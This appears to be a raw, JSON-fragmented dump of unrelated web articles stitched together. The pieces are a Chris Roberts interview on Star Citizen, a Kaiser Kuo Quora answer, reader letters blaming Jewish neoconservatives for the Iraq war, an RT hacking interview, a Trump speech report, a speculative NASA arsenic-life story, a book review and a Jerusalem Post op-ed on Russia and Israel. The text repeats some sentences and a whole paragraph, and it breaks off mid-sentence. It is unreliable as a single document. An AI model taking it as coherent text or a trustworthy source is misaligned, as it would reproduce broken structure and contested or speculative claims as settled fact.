the '90s. \"One of the reasons I sort of left the business for a while was because I was feeling increasingly disconnected from my audience,\" he said. The breaking point came when the 12 to 18 months development cycles Roberts was used to stretched into a four-year slog with Freelancer. \"Spending that many years disconnected from your audience, sort of working off by yourself, wasn’t creatively fun for me. I love that [now] I can interact with my community even when I’m developing, because it’s fun. I love what I do.”\n\nTo help keep Star Citizen development from dragging on that long, Roberts will be starting with the pre-made CryEngine 3 for Star Citizen. That's a first for Roberts, who has always built new engines for his games from scratch in the past. \"This time around, I look at it [and] say, 'I could put a team together, I could build a really good engine, but that’s going to take me two years.' During that time I could be using resources and time to improve an existing engine and also build the features I want specific to my game... If I’m making a movie, I’m not inventing a camera before I use it.”\n\nLiving up to the promise\n\nTo call Star Citizen ambitious feels like an understatement. In many ways, the game promises to be all things to all gamers. It will provide both a deep single-player experience and an MMO with no monthly fee, complete with an EVE Online style, supply-and-demand based economy to boot. Technically, Roberts promises a realistic physics system and scalable graphics that pack \"ten times the details of current AAA games.\"\n\nIt sounds like a lot to promise, especially for a game that is relying on crowdfunding donations to help get it made (Roberts says additional private investment will help push the total budget above $10 million). But Roberts says that, while developing such a massive game is going to be hard, it's not quite as impossible as it might seem.\n\nThe Wing Commander connection It's hard to avoid drawing comparisons between Star Citizen and Wing Commander, the game that first put Roberts on the map. Even though the Wing Commander license is still controlled by Electronic Arts, I had to wonder if Roberts had started out trying to make another game in his established universe. It's hard to avoid drawing comparisons between Star Citizen and Wing Commander, the game that first put Roberts on the map. Even though the Wing Commander license is still controlled by Electronic Arts, I had to wonder if Roberts had started out trying to make another game in his established universe. \"I would be lying if I said I didn't have conversations with them off and on, so who knows. But the key for me is to be able to build a universe and curate it and be in charge of it,\" he said. \"If I go back to Wing Commander I have to feel like I’m in a position where I can guide that ship. And of today that’s not the case. But everyone’s cool, so who knows.\" Roberts noted how rights issues with Microsoft prevented him from making a sequel that included a lot of the features he wanted to add to that universe, and he wanted to prevent that situation in any new game he makes. \"I want to be in a position with Star Citizen or any universe I‘m building [to] curate in a long-term manner. With Wing Commander, it’s EA’s IP, so I’m not in that same situation... That’s why I’m doing Star Citizen.\" He had good things to say about his relationship with Electronic Arts, though, and he continues to maintain relationships with former coworkers there. \"I know there’s a lot of people who think EA is the big evil publisher, but my experience has been nothing but positive.\" Even without access to his Wing Commander IP, Roberts hinted that Star Citizen wouldn't be all that different. \"What I’m building is exactly—if I had the IP—what would basically be Wing Commander/Privateer... If you’re a Wing Commander player or a Privateer fan, what I’m building will be 100 percent what you want. The only thing you’ll be missing is the names and the exact universe or fiction, because obviously that’s not something I own.\"\n\n\"Think of what Freelancer had ten years ago. It doesn't have that much less than what I’m promising now,\" he said. \"Rather than 100 on a server, I’m promising a meta-server on top of that can bring it to millions of people.\"\n\nUnlike other MMOs, where everything has to take place in an engine that can handle hundreds or thousands of people working on a single server, Roberts says he considers the massively multiplayer portion of Star Citizen as \"more an in-fiction matchmaking service.\" The central servers will keep track of things like players' money, items, ship status and current location. It will then use dynamic matchmaking to create separate battle instances when two players cross paths with their ships.\n\n\"There’s never a situation where it’s got to worry about 10,000 or 5,000 people being in the same location, like it has to in a traditional MMO,\" Roberts said. Players will also be able to interact off-ship on planets that serve as \"an in-fiction chat room, mission selector, and shop. We could do that with a simple boring Web interface, but that’s not my style. My style is 'let’s make it feel like a persistent world.'\"\n\nBusiness-wise, Roberts said Star Citizen will operate on a Guild Wars II-style model, where players buy the base game and occasional mission packs, but they won't have to pay a monthly fee. And while Star Citizen will offer in-game purchases as part of its business model, Roberts was adamant that there won't be anything in the game that you can't buy solely with in-game money, if you're willing to put in the time to earn it. Those who want to buy their way to a cool in-game setup will probably be limited by a per-month real-world currency cap, Roberts said, but even without that kind of system, there would be limits to how much advantage a Star Citizen player can get by throwing their money around.\n\n\"It’s not like an MMO where if you’re at level 80 you’ve got this incredible damage bonus and things like that,\" he said. \"The game is skill based, so how you fly affects what’s going on. There is no undefeatable build of a ship. You could spend a whole bunch of money building an amazing ship with huge weapons and armor, but it’s probably going to be slow. Someone who’s a good pilot spends less money and builds a light, maneuverable ship. Sure, if you hit him one time the lighter ship will blow up, but if you don’t manage to hit him he tags you with 20 hits and you go down.\"\n\nPower to the PC\n\nRoberts has been quite vocal about targeting Star Citizen as a PC exclusive, for one simple reason: the PC is the only platform that he considers powerful and versatile enough to give the kind of experience he wants.\n\nHow real is too real? Roberts has made much of the realistic physics modeling that he's putting into Star Citizen, but those kinds of statements almost got him in trouble with some eagle-eyed gamers on the Star Citizen forums. The commenters noticed that the video footage from the game didn't seem to show the kind of retro-fire you'd need to steady the ship and balance out the massive thrust coming from the main engines. Turns out, Roberts says, those kinds of small details would actually make the game look less realistic in some ways.

Turns out, Roberts says, those kinds of small details would actually make the game look less realistic in some ways. \"When you see movies and see how [spaceship] thrusters fire in movies, it’s not really accurate, because usually what would happen is you’d have a really quick fire flicker on and flicker off,\" he said. \"When I had the visual showing what was actually happening in the system, there were lots of thrusters flickering and moving back and forth and it looked kind of buggy... I don’t want to make it exactly what it is in reality, because it looks weird.\" While the physical underpinnings are 100 percent accurate, Roberts says, there are still some concessions to gameplay as well. \"If you think about Wing Commander, you think about Star Wars, let’s face it, real space battles are not going to be at World War II dogfighter speed. It’s all going to happen at incredibly long range and you’ll never see your opponent, and it will be computers calculating trajectories and that’s not fun… You’re trying to make some things that have some level of realism in them, but at the end of the day you’re trying to build something that’s kind of unrealistic to what space combat would be. I don’t think anyone wants a completely accurate space combat simulator, because that would be boring.\"\n\n\"What I was showing you can’t do on a current generation console,\" Roberts said of Star Citizen's initial proof of concept video. \"You can do most of it on a next generation console, but I can promise you a top-end PC now is already more powerful than what a next generation console is going to be.\"\n\nThe main reason, Roberts says, is memory capacity. \"You can’t do that much with 512MB [of RAM on a console], so that constrains a lot of your game design. If I’m building a PC game, I’m going 'Yeah, you need 4GB on your machine.' Of course you’re not going to get all 4GB because Windows is a hungry beast, but you’re getting a lot more than 512MB so it kinds of open up what you can do, what you can fit in memory at the same time, and it changes your level of ambition.\"\n\nFour gigabytes of RAM might sound like a lot, but keep in mind that Star Citizen isn't set to see a final release for another two years. \"I’m looking at the high-end [hardware] today being the 'Normal Gamer' level in two years time,\" he said. \"It'll be kind of like Wing Commander used to be. If you had the extra memory, if you had the 386, it was a better experience, but you could still play it on a 286.\"\n\nRoberts added that he hopes Star Citizen proves that a high-end PC is good for more than warmed-over ports of games made for the consoles. \"I have a high-end gaming rig, but I’ve also got all the consoles, and if someone is making a game for a console first, and it’s being ported to the PC, I’m always buying it for the console. I don’t want a buggy port of a console game on my PC that doesn’t really show my PC off.\"\n\n\"I have an iPhone and I can watch The Dark Knight Rises on it, but I don’t want to watch The Dark Knight Rises on my iPhone—I want to see it in IMAX on a big screen, and I’m willing to spend $18 to see it on the big screen in IMAX versus downloading it for a couple of dollars on my iPhone. I definitely think there’s a PC gaming audience like that.”",

He’s a Quora Top Writer five years running, which means he’s provided ample content for us to mine in this new weekly column.\n\nWe begin with a most fitting question, asked on January 2, 2011 :\n\nHow did Kaiser Kuo get the name Kaiser?\n\nIt’s a goofy botched patronymic. My father’s name (rendered in pinyin) is Guo Jingkai, with “Jing” being the generational name he shares with his brothers (and presumably with some of his first cousins). So his real “given” name is Kai, and my folks used that as the basis for a name. Many years ago, while cleaning out the garage back at my family’s old home in Tucson, Arizona, I came across a book from the early 1960s called What to Name the Baby, and in it I found the name Kaiser, given as an alternate to Caesar, with a faded pencil tick next to it.\n\nPresumably Dad hadn’t studied much of the history of the First World War: Even though his father was a very eminent historian, my father alas chose to study applied physics and engineering.\n\nThere’s a broader context to this, I think. Many Chinese of my parents’ peer group–sons and daughters of mainland intellectuals who had fled to Taiwan, and who had emigrated to the U.S.–gave their kids odd names out of a non-conformist impulse. Thus I grew up knowing kids named Baldwin, Stanford, Athena, Kingston and so forth. My own siblings are Meiklejohn (he goes by John, sensibly), I’m next, and then they got sensible with my younger brother Lee Jacob, who goes by Jay, and my sister is Miranda, but goes by Mimi.\n\nIt’s been a mixed blessing.

  "latent_12556": "The other day I published a dialogue with Ron Kampeas of JTA on the question,\n\nDo Jewish neoconservatives bear responsibility for the Iraq war disaster? Two very smart friends in the media have sent me addendums to the discussion.\n\nBoth are more thoughtful than my (quick) response to Kampeas. Letter one:\n\nYou should ask Kampeas: What other group, if not neoconservatives who happen to be Jewish, pressed this hard early and often for attacking Iraq? I want names and citations.\n\nOne can hypothesize that they were not the single, deciding factor in the push, but one cannot deny the simple fact that they, along with, yes, a few of their aggressive nationalist allies in tow, led the charge for war with Iraq. Then it actually happened. But not, we’re told, just because of them.\n\nKampeas’s bit about anti-Semitism is a weird strawman. It’s not that The Jews caused the war, but rather that Some Jews — Jewish neoconservatives, who despite common acquiescence to their narratives in the larger Jewish establishment, still constitute a vast minority of American Jews — were leaders in the push for war with Iraq.\n\nPeople will dismiss these points as conspiracy theorizing. But is this history real? Does anyone deny it happening? Is it just a coincidence that the champions of these causes, clearly linked by Clean Break to issues of Israel, ended up in prominent posts in the Bush administration which by then merely happened to come into office already decided on leveling Iraq? Can we deny that these efforts were unequivocally spear-headed — both in public opinion and in policy apparatuses — by dyed-in-the-wool neoconservatives? (Remember: the Cheneys, Rumsfelds and Boltons signed the letters, but the organization itself was founded by two neoconservative leaders.)\n\nIn 2000 Kristol and Kagan launched a book, ‘Present Dangers’, where Perle wrote the chapter on Iraq. Weeks after 9/11, another PNAC letter prioritized Iraq. In April 2002, yet another letter “urg(ing) [Bush] to accelerate plans for removing Saddam Hussein from power in Iraq,” including, as you mention, citing terror against Israel as a reason.\n\nBy 1998, the group issued its letter to Clinton on Iraq, making “the removal of Saddam Hussein’s regime from power” a top policy priority, and prescribed “a willingness to undertake military action.” The signatories included again non-Jewish aggressive nationalists like Bolton and Rumsfeld, but the list is again dominated by the neoconservatives who would, like those colleagues, move into positions of power in the Bush administration, among them Perle, Abrams, Wolfowitz and of course the group’s founders.\n\nIn fact, the Israeli focus on Iraq ties together neatly with Clean Break , wherein a group of U.S. neoconservatives wrote lines for a partisan political speech for incoming prime minister Bibi Netanyahu, and included policy background. That document clearly states these U.S. neoconservatives’ interest in upending Saddam and rather hilariously proposed that replacing Saddam with a Hashemite kingdom (Democracy!) would weaken Iran’s position. That was 1996. In 1997, Bill Kristol and Robert Kagan, two leaders of the neoconservative movement, launched the Project for a New American Century. The ‘founding principles’ and subsequent letters and documents of PNAC were signed by a who’s who of neoconservative allies like Cheney and Rumsfeld, but the signatory lists for each are dominated by neoconservatives, including but not limited to Norman Podhoretz, whose views with regard to Israeli/Jewish interests you’ve delved into at length.\n\nYes, Cheney and the White House rose to office looking to unseat Saddam, but where did the motivation to do this spring from? The Bush administration ethos was not built in a day, on January 20, 2001. Remember, Iraq was decimated after the First Gulf War, yet that article you cited the other day on Israel’s Eastern Front tells us Israelis were already in a huff about Iraq rebuilding immediately after the war: “Iraq was in fact the primary threat that the IDF believed it faced until the mid-1990s following the First Gulf War,” till the focus allegedly shifted to Iran.\n\nSecond letter:\n\nI was very interested to read your most recent response to Ron Kampeas. It is, as you say, a “good debate.” If I may chime in on it, I think you have made some errors in parts of your argument.\n\nSome of those errors lean unnecessarily to the right, so to speak, by conceding too much to the neoconservatives’ regarding the role of Israel in their motives. Other of your arguments lean too far left by making sweeping negative generalizations about “the neoconservatives” that glop together two generations of neoconservatives as one undifferentiated big, bad thing.\n\nBut let me address your characterizations of neoconservative motivations in supporting the Iraq war. You state: “No one ever said that Cheney and Bush and Rumsfeld didn’t start the war. They started the war. No one said that some of these planners didn’t have a deluded American interest in mind that had nothing to do with Israel. The irresponsibility that Kampeas is exhibiting here is the claim that ideas are not important in such matters. The best and brightest fostered the Vietnam war for some reasons I haven’t studied; and in this instance, the idea that was relentlessly promoted by the neoconservatives was the claim that by imposing democracy by force on an Arab nation of importance, democracy would take hold across the region. This was a very powerful and very stupid idea. It held sway. It affected Ken Pollack and Tom Friedman deeply. …neoconservativism came out of the Jewish community, and its forefathers Irving Kristol and Norman Podhoretz specifically formulated the school because they feared that a weak American military program would drive a knife into Israel, as Kristol framed it. In the runup to the Iraq war, neoconservatives, who were to be sure not only Jewish, pushed the Iraq war because they said Israel’s war against terror is our war. In countless manifestos for the war (Paul Berman, Kristol and Kaplan, Wurmser, Frum, Perle), Saddam’s actions against Israel in supporting suicide bombers were described as a threat to the west. Israel was on their minds.”\n\nIn fact, they did not hold that we should attack Iraq because Israel’s war on terror was our war. They were much more explicit about both Israel being on their minds, and on the specific way that they hoped the Iraq war would aid Israel.\n\nShortly before the war started, this piece by Larry Cohler-Esses appeared in the Forward that elucidated this. “One-Track Minds on Two-Track Mideast Solutions, January 24, 2003.” Excerpts follow [six long paragraphs, marked off by quotations]:\n\n“In 1975, Assistant Secretary of State Harold Saunders scandalized Congress by becoming the first administration official to tell lawmakers that the Palestinian problem was the “heart of the conflict” between Israel and its Arab adversaries. Despite the shellacking Saunders took for his stance, a generation of Israeli and Western peacemakers ultimately adopted his view that the Palestinian problem was both solvable and the key to unsnarling the layers of wartime barbed wire between Israel and its Arab adversaries.\n\n“Now, the Bush administration has all but declared war on Iraq, while the Israeli-Palestinian conflict sinks every day to new lows. And there are some — perhaps even Bush himself — who seem ready to flip Saunders’s premise on its head. Maybe, they say, settling the “Arab problem” is the key to the Israeli-Palestinian conflict, not the other way around. It’s a corollary to the goal of region-wide reform, if not revolution, that Pentagon policy-makers such as Paul Wolfowitz seek via the defeat of Saddam Hussein’s bloody regime. Indeed, Fouad Ajami, one of the foremost cheerleaders of the Wolfowitz project, describes one of its great virtues as the chance to deal a fateful body blow to “virulent pan-Arabism” of the sort that sustains violent Palestinian resistance, including terrorism, against Israel’s occupation of the West Bank and Gaza. …\n\n“It’s a conclusion that proponents believe a chastened Syria and Iran — both of which would be encircled by American bases and/or Israel after an American victory over Iraq — will also reach. David Makovsky of the Washington Institute for Near East Policy explains, “The Bush administration’s hope is that with Iraq’s defeat, there will be dividends in the Iran-Syria-Hezbollah cluster, and that if Saddam goes, then Yasir Arafat’s star dims. Then, it’s a new constellation. If all of a sudden you have a more benign environment, concessions that are impossible for Israel under current conditions may become possible.”\n\n“That’s one possibility. It may even be supported by Wolfowitz, the administration’s resident Wilsonian idealist. ..\n\n“At the side of the current President Bush — and Wolfowitz — are a panoply of Pentagon hawks with a history of bristling, deeply ideological opposition to the notion that peace should be based on large territorial concessions to create a sovereign Palestinian state. One of these is Douglas Feith, the undersecretary of defense for policy generally seen as the No. 3 official in the Pentagon. I can bear personal witness to Feith’s adamancy on the issue. As a reporter during the late 1980s and early 1990s for Washington Jewish Week — whose attorney he was — I debated him several times over dinner on the very notion of Palestinian peoplehood. It was also personal. Feith was then one of the two principals of the Washington law firm Feith & Zell — the other being his close friend Mark Zell, a West Bank settler and prominent ideologue for the settlers movement. Zell recently wrote that “if you deny the legitimacy of our [West Bank] habitations, you deny the legitimacy of the entire Jewish state.” In 1996, Feith co-wrote [CLEAN BREAK, referenced above] a proposed agenda for the incoming administration of Prime Minister Benjamin Netanyahu with, among others, Richard Perle, now chair of the Pentagon’s Defense Policy Board, and David Wurmser, now special assistant in the State Department. Territorial compromise is not part of the agenda. Rejection of the Oslo peace process forms its core. The paper declares “removing Saddam Hussein from power in Iraq” to be “an important Israeli strategic objective in its own right as a means of foiling Syria’s regional ambitions.” …\n\n“In other words, it is vanquishing the Arab problem that will quiet the Palestinian conflict — and, apparently, enable Israel to retain its settlements. Last August, the influence of these counselors was apparent on Secretary of Defense Donald Rumsfeld, whose sway over Bush these days is undisputed…. “\n\nAbout your error leaning too far left, so to speak: You cite Norman Podhoretz and Irving Kristol from that generation to make your case that neocons have always and everywhere been about defending Israel. They were, for sure, all Zionists. But important members of the first generation–folks like Daniel Bell, Nathan Glazer, Seymour Martin Lipset, Saul Below–brought to early neoconservatism a greater diversity of views on Israel (and on the question of publicly criticizing Israel) than most folks have bothered to notice or acknowledge. Several supported Peace Now…\n\nThe second gen, unfortunately, are just lockstep apparatchik mediocrities.",

Tackling ISIS - both abroad and in the West - would be the most obvious one\n\nRT: When will solid, incontrovertible evidence be provided to back up these hacking allegations? Why hasn't it been so far?\n\nBen Harris-Quinney: I think as the President of the US Trump said: ‘The truth is that no one knows and although at least very few people know.” And very few people know because there has been no clear evidence on either side.’ What we do know, however, is the Trump administration is certainly concerned about the allegations that have been made, and it has caused some drag on the early days of the administration. We also know that many of the accusations have been disproved and major media networks, like CNN and The Times, have had their accusations proven to be false. Until there is clear evidence, it is very difficult for anyone to act, or anyone to form an opinion. The words of Nikki Haley that we’ve heard there – I think everyone’s very interested to learn what information that she has to back up those comments… If no evidence emerges, then I would imagine it would pass into history as an unsubstantiated claim.",
  "latent_13031": "BRENTWOOD, N.Y. — Hours after another defeat at the hands of the Republican-held Senate, President Trump launched into a speech about immigrant gang violence on Friday and wound up delivering a de facto campaign rally with a spray of Long Island police officers applauding behind him.\n\nIn his second brief appearance in his home state since taking office — this time in a small auditorium at the Suffolk County Community College in Brentwood — Mr. Trump described cities as “bloodstained killing fields” that were overrun with undocumented immigrants before his inauguration in January. He described the perpetrators of violent crimes as “animals” and said his administration seeks to “dismantle, decimate and eradicate” gangs.\n\nHe also used his roughly 30-minute speech to bolster the police, urging them to be less “nice” in arresting immigrant criminal suspects or gang members whom he described as enraptured by slow torture of their victims. The gang La Mara Salvatrucha, or MS-13, has been accused of a string of heinous gang murders on Long Island.\n\nAs expected, Mr. Trump called on Congress to fund hiring 10,000 more Immigration and Customs Enforcement agents to crack down on undocumented immigrants in the United States, including those he said pose a criminal threat, and added that the initial spending for his proposed wall on the Mexico border was just approved by the House.",
  "latent_13035": "NASA scientists will announce a major discovery this Thursday that could boost the chance of life on other worlds. Experts believe they will say they have found a new form of life on Earth that is completely alien to anything known before.\n\nNASA, who have called a full scale press conference for tomorrow, have tried to keep their findings under wraps, though an accompanying scientific paper has been released to some journalists under embargo.\n\nSkymania has not seen the paper and so has been free to do some detective work to discover what will be announced. Despite wild speculation on the internet, there is unlikely to be an announcement that extra-terrestrials have been discovered, for the reasons very well put forward by Stuart Atkinson’s Cumbrian Sky.\n\nBut our own investigations suggest that it follows a breakthrough in the discovery of microbes in a lake that get their energy from the usually poisonous arsenic. Experts say this shows they had a completely different origin to any other creature known on our planet. It means that life began not just once but at least twice on Earth. Update: The conference has since revealed that, though the microbes appear to have adapted to use arsenic, they do not appear to be an independent life-form, i.e. a shadow biosphere. Read Ed Yong’s excellent take for more.\n\nA key scientist on NASA’s panel will be Dr Felisa Wolfe-Simon who has spent two years investigating Mono Lake, close to California’s Yosemite National Park. The lake has no outlet and has, over many millenia, built up one of the highest natural concentrations of arsenic on Earth.\n\nGeobiologist Dr Wolfe-Simon has been looking to see whether microbes with a totally different make-up to that of conventional carbon-based life could have developed. There was an interesting article about her search for alien life on Earth in NASA’s online Astrobiology Magazine.\n\nThe importance that NASA attaches to her discovery and its implications for finding extra-terrestrial life is demonstrated by the fact that they will have on tomorrow’s panel experts on two other sites in the solar system where life might have developed.\n\nThey are Pamela Conrad who is looking for life on Mars and Steven Benner who is studying Saturn’s largest moon Titan which has a dense atmosphere like Earth but lakes of liquid methane rather than water. Also on the panel will be ecologist James Elser who is involved with a NASA-funded search for ET.\n\nAll life previously discovered is of one basic type because it relies on phosphorus as an essential building block. The newly found microbes seem to use arsenic instead.\n\nAstrobiologist Dr Lewis Dartnell, of the Centre for Planetary Sciences in London, told Skymania today: “Mono Lake has a very high concentration of arsenic dissolved in it which is usually poisonous and consequently there’s not much life.\n\n“I’m 90 per cent certain that Felisa has found something in Mono Lake and they have been able to demonstrate in some way that it uses arsenic in its metabolism rather than be poisoned by it.”\n\nHe added: “Phosphorus is key and absolutely essential for life. It forms the backbone of DNA. Every form of life of Earth we have known so far depends on phosphorus as well as another molecule called ATP, an energy storage molecule, or biological battery.\n\n“It is exciting to find life in an arsenic-rich environment. If these organisms are using arsenic in their metabolism, it demonstrates that there are other life forms to that as we know it.”\n\nDr Dartnell went on: “There is no reason to expect that life arose just once on Earth. It could have arisen any number of times. The only reason that all life we have found so far has all descended from the same progenitor – the same mother of life – is because we’ve been looking for life in the same way.\n\n“But if you start looking in extreme environments like Mono Lake, where our kind of life doesn’t survive very well, that’s where you find fundamentally different life forms with a separate origin. They’re aliens, but aliens that share the same home as us.” (Update: Just for the record, Lewis was not suggesting that a shadow biosphere would be announced by the NASA conference, simply that it was something biologists look for.)\n\nDr Wolfe-Simon has previously said of her research: “It may prove that there are other possibilities that are beyond our imagination. It opens the door for us to think about biology in ways we have never thought.\n\n“We are going to look for life on other planets and we only know to look for that which we know. This may help us to develop tools to look for something we have never seen.”\n\nLast year NASA revealed the detection of plumes of methane on Mars that offered compelling evidence that there might be life on the red planet.\n\nBritish space scientist Professor Colin Pillinger, who has devoted his life to finding life on Mars, told Skymania: “If they have found anything which they can attribute to arsenic-based life then it is very interesting and obviously has connotations for other places in the universe where life forms other than the ones on Earth may very well have developed.”\n\n• Discover space for yourself and do fun science with a telescope.

  "latent_13803": "Ever since Frederick Jackson Turner announced the closing of the frontier in 1893, Americans have revered the pioneers. Countless pieces of literature and art immortalize the frontiersmen as the vanguard of civilization that helped spread democracy and capitalism across North America. The 1872 painting American Progress is probably the most famous depiction of the archetypal American, a rugged-individualist who despises big government and answers only to God.\n\nThis is an incomplete picture at best. The settlement of western lands did drive democratic expansion and economic development. However, the west was not the sole frontier. As David McCullough states in his excellent work, The Greater Journey: Americans in Paris, “not all pioneers went west.” Some voyaged to Europe in search of, and returned home with, intellectual capital.\n\nMcCullough’s chronicle of some of the thousands of Americans, mostly men, who visited Paris in the Nineteenth Century, is a good read. He sketches portraits of famous Americans, such as Samuel Morse (the inventor of the electric telegraph) and Charles Sumner (a leading abolitionist), when they were young and hungry. They arrived in France “ambitious to excel in work that mattered greatly to them, and they saw time in Paris… as essential to achieving that dream.”\n\nThe first Americans to land in France in the 1830s were an eclectic group; medical students, artists, and writers. They were also very talented. Samuel Morse, Charles Sumner, Oliver Wendell Holmes Sr., and James Fennimore Cooper counted among the first wave. But at that time, almost all of them were unknown. They went to Paris to “study hard” as the painter George Healy stated. Even Cooper, already famous for his novel The Last of the Mohicans, shared his cohorts’ emphasis on work. He wrote eight novels during his seven years abroad.\n\nThe U.S. was better for their efforts. It was alongside black students at the Sorbonne that Sumner first discerned the lies undergirding America’s racial system. As he recorded in his journal in January 1838, “the distance between free blacks and whites among us is derived from education, and does not exist in the nature of things.”\n\nAcross the Seine, Morse chased his dream of becoming a painter. He worked tirelessly in the Louvre and his close-friend James Cooper provided moral support. But while a career in art did not materialize, Morse got an idea for an electric telegraph after he observed some primitive French models. According to Cooper, the idea became an obsession. It would also lead to “the annihilation of space” and change communications forever.\n\nThe chapter on “the medicals” exemplifies the intellectual capital brought home by expatriates. “Between 1830 and 1860 nearly seven hundred Americans came to Paris to study medicine,” and McCullough follows four of them; James Jackson Jr., Oliver Wendell Holmes Sr., Mason Warren, and Henry Bowditch. It is through their eyes as students at l'École de Médecine that the disparities between early American and European medicine are manifest.\n\nAs McCullough notes, “most aspiring physicians in America never attended medical school.” Only twenty-one schools existed in the U.S. in the 1830s, and they were poorly staffed with no more than five or six instructors. Most students learned by apprenticing under poorly trained practitioners. Moreover, arcane state laws restricted commerce in corpses, raised the cost of cadavers, and occasionally turned medical students into grave robbers.\n\nBy contrast, Paris was paradise. The library at the École contained 30,000 volumes where as New York’s College of Physicians and Surgeons had 1,200. Paris hospitals served tens of thousands every year whereas Massachusetts General Hospital treated less than a thousand annually. The École’s faculty lectured on various subjects and even allowed non-medical students to observe their rounds in the hospital.\n\nThe pace was frenetic. Holmes wrote to his father that he “never was so busy in my life.” Jackson absorbed everything he could: “not a day passes that I do not gain something new in itself or something old with renewed force.” Such enthusiasm for work made some French doctors “partial to American students.” The feelings were mutual. Jackson came to see Pierre-Charles-Alexandre Louis, the foremost expert on diseases of the chest, as a second father. And amid the cholera epidemic of 1832, Jackson became “the master’s favorite” apprentice.\n\nThis is not to say that medical education in France was perfect. Medicine was still in its infancy in the 1830s, and it showed. The absence of anesthesia made surgery an agonizing and dangerous proposition. By Jackson’s estimates, two-thirds of surgical patients later died from infection because sterilization did not exist. But ultimately, what mattered is what the students learned. They had long careers in America because of their knowledge gained abroad as much as natural skill.\n\nAfter chronicling the first Americans in Paris, McCullough’s narrative roams through the Nineteenth Century. The reader encounters successive waves of expatriates who resided in a city undergoing radical changes. Some witnessed Paris’ modernization under Emperor Louis Napoleon and Georges Haussmann. Haussmann was a self-styled “demolition artist,” and he razed buildings and slums with impunity. In their places, he constructed wide boulevards to improve traffic flows (71 miles of road in total), created green spaces, and built new government buildings such as the Palace of Justice. Upon returning to Paris in the 1850s, Charles Sumner called the renovations “prodigious.”\n\nThe modernization of Paris is juxtaposed with the dark chapter of the Franco-Prussian War (1870-1871) and the Paris Commune of 1871. In a notable find, McCullough uses the diary of Ambassador Elihu Washburne. The American diplomat stuck it out during the German siege, and his descriptions of the travails of war are horrifying: citizens eating cats, famous buildings on fire (the Palace of the Tuileries), and the army drowning the revolutionary commune in blood.\n\nHowever, the chapters on high politics are an interlude. McCullough quickly switches back to the cultural arrivals after the war. The Americans who came in the last quarter of the Nineteenth Century were, in a way, similar to the avant-garde of the 1920s. Augustus Saint-Gardens embarked for Paris as a penniless nineteen year-old and became a wealthy sculptor. The statue of Admiral David Farragut that stands in Madison Park in New York is among his best works. The painters Mary Cassatt and John Singer Sargent found validation abroad. Their Impressionist works won critical acclaim in 1879 as the movement was beginning to transform the art world.\n\nThe Greater Journey is more of a collection of chronicles than a cohesive story. McCullough did not necessarily set out to disprove the frontier myth that captivates the American consciousness. Instead, he pulls back the curtain on a forgotten truth. The United States grew rich because its people did not just cultivate land, but their individual talents.\n\nIn a subtle and unintentional way, McCullough made a powerful case for free trade. The exchange of ideas involved in trade is wrongly neglected. It matters as much as swaps of goods and services because knowledge is dispersed. No man can master everything about his own profession, let alone achieve omnipotence. But he can learn from others, and apply such knowledge in pursuits that may benefit humanity by removing unease from life.\n\nWhen American expatriates returned home, they brought back knowledge that was unavailable in North America. But like the pioneers in the west, their experiences in Europe were formative for the United States. Many went on to distinguished careers in the arts, literature, medicine, and politics, and we still live on their intellectual capital today. Americans owe them, and the French, a great deal of gratitude.",

  "latent_13934": "Dear Reader, As you can imagine, more people are reading The Jerusalem Post than ever before. Nevertheless, traditional business models are no longer sustainable and high-quality publications, like ours, are being forced to look for new ways to keep going. Unlike many other news organizations, we have not put up a paywall. We want to keep our journalism open and accessible and be able to keep providing you with news and analysis from the frontlines of Israel, the Middle East and the Jewish World.\n\nLove him or hate him, Russian President Vladimir Putin's military intervention in Syria unquestionably upended Middle Eastern politics. Putin supported Syrian President Bashar Assad, established several military bases in Syria, created a de-facto Russian-Shi'ite axis, confronted Turkey and forced the West to re-engage with him.\n\nWhile all the region's major players feel the influence of Russia's military campaign, one country overlooked by commentators analyzing Russia's Syrian campaign is Israel. Israel's interests vis-à-vis Russia run wide and deep and are impossible for Jerusalem to ignore.\n\nThe history of the Israeli-Russian relationship is complicated, to say the least. The Soviet Union supported the creation of Israel in 1948, but then tilted towards the Arab world in the early 1960s and even threatened to attack Israel in both the 1967 Six Day War and 1973 Yom Kippur War.With the emergence of Putin, though, Israel found the closest thing to a friend it's ever had in Moscow. Israel and Russia share a common fear of terrorism, and in 2014 Putin was one of the few world leaders to support Israel's Operation Protective Edge against Hamas, saying \"I support Israel's battle that is intended to keep its citizens protected.\" In 2005, Putin became the first Russian president to ever visit Israel, visiting the Western Wall - Judaism's holiest site - as well as Israel's Yad Vashem Holocaust memorial, where Putin observed a moment of silence. The Russian president even reportedly purchased an apartment in Tel Aviv for his then-84-year-old Jewish German teacher. Putin returned to Israel in 2012 as the guest of honor at a state dinner and to inaugurate a monument to the Red Army soldiers who defeated Hitler in World War Two.Despite these positive feelings, Russian national interests remain Putin's priority, and as Russia modernizes its military and steps to the fore in the Middle East, Moscow possesses significant capabilities to either help or hinder key Israeli interests.First, although Israel remains determined to avoid entangling itself in Syria's intractable war, there is one \"red line\" Jerusalem remains determined to enforce: it will not allow the transfer of advanced weapons from Iran or Syria to archenemy Hezbollah. The Israeli Air Force has not hesitated to enforce this policy, striking weapons convoys in Syria destined for Hezbollah numerous times since the start of the Syrian war.As a result, Russia's deployment of advanced surface-to-air S-400 missiles is of grave concern to Israel. With a radius of 250 miles and the ability to target up to 36 aircraft simultaneously, the S-400 is a potential game changer. One senior Israeli officer went so far as to describe it as a potential \"nightmare.\" In the event of a serious deterioration in the Israeli-Russian relationship, the S-400 could greatly complicate the Israeli Air Force's ability to strike weapons shipments en route to Hezbollah through Syria. Israel therefore needs assurances from Russia that the S-400s will not impinge the freedom of movement Israeli jets possess over Syrian airspace.As a result of these concerns - as well as the general desire to avoid accidental clashes with the Russian military - Prime Minister Benjamin Netanyahu visited Moscow to meet Putin as soon as the depth of Russia's military commitment to Syria became clear. After this meeting - as well as a subsequent conversation with Putin in Paris on the sidelines of the Climate Conference - Netanyahu believed Putin respected Israel's Hezbollah red line.Six weeks later, though, the picture appears murkier. According to a recent report, Russia is transferring weapons directly to Hezbollah, since Moscow views Hezbollah as a more effective fighting force than the Syrian army. If the report is accurate - and it's not yet clear it is - two questions emerge: Is Russia transferring the same types of weapons to Hezbollah that Hezbollah has already acquired from Iran, or are they more advanced? And would Russia permit Hezbollah to use these weapons against Israel as well as the Syrian rebels? Either way, Netanyahu must remain on good terms with Putin to ensure Moscow takes Israeli concerns about Hezbollah into account going forward.The Israelis also fret about Russia's supply of weaponry to Iran. After initially signing a deal with Iran in 2007 to supply S-300 anti-aircraft missiles, Russia turned around and canceled the deal - under pressure from the West, and at least partly out of respect for Israel's security concerns. After heeding Israeli concerns for nearly a 